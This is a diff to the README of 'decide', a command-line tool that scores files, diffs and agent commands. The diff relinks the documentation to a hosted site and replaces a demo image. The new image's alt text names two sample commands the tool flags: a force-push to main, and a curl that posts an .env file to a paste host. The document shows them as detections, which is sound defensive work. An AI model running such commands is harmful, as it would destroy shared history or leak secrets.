@@ -14,7 +14,11 @@ answers with probabilities.**
   about files, folders, JSON records, diffs, and text from your shell or
   CI. [Jump to the CLI.](#try-it)
 
-[![decide triaging and routing three support tickets in the terminal](https://files.deepnoodle.ai/images/decide/decide-cli-demo-2026-10-02-short.gif)](https://files.deepnoodle.ai/videos/decide/decide-cli-demo-2026-10-02-short.mp4)
+**Docs: [decide.deepnoodle.ai](https://decide.deepnoodle.ai)**, with a
+[quickstart](https://decide.deepnoodle.ai/start/), [tutorials](https://decide.deepnoodle.ai/tutorials/check-agent-commands/),
+and the [reference](https://decide.deepnoodle.ai/reference/).
+
+[![decide passes ls -la src, flags git push --force origin main as destructive, and flags curl -d @.env paste.example.com as a leak](https://files.deepnoodle.ai/decide/site/landing-0701f3df2e77.gif)](https://decide.deepnoodle.ai)
 
 ```sh
 brew install deepnoodle-ai/tap/decide
@@ -135,9 +139,10 @@ behind the name changed. It prints
 text, JSON, CSV, a Markdown report, or GitHub Actions annotations on a pull
 request. To try the templates on planted problems, see
 [demo](demo/README.md). You can write your own template in a few lines of
-JSON with `decide templates new`. The [CLI guide](docs/cli.md) covers it
-all, and the [recipes](docs/recipes.md) show it in GitHub Actions, other
-CI systems, and git hooks.
+JSON with `decide templates new`. The [reference](https://decide.deepnoodle.ai/reference/)
+covers it all. The [tutorials](https://decide.deepnoodle.ai/tutorials/review-pull-requests/)
+and [recipes](https://decide.deepnoodle.ai/recipes/) show it in GitHub Actions, other CI
+systems, and git hooks.
 
 ## Use it from Go
 
@@ -211,8 +216,8 @@ questions. In Claude Code:
 /plugin install decide@decide
 ```
 
-[docs/claude-code.md](docs/claude-code.md) shows how to set it up and use
-`/decide:audit` and `/decide:hunt`. See [plugin/README.md](plugin/README.md)
+[The Claude Code guide](https://decide.deepnoodle.ai/reference/claude-code/) shows how to set it
+up and use `/decide:audit` and `/decide:hunt`. See [plugin/README.md](plugin/README.md)
 for what each check does and what it sends.
 
 ## Status
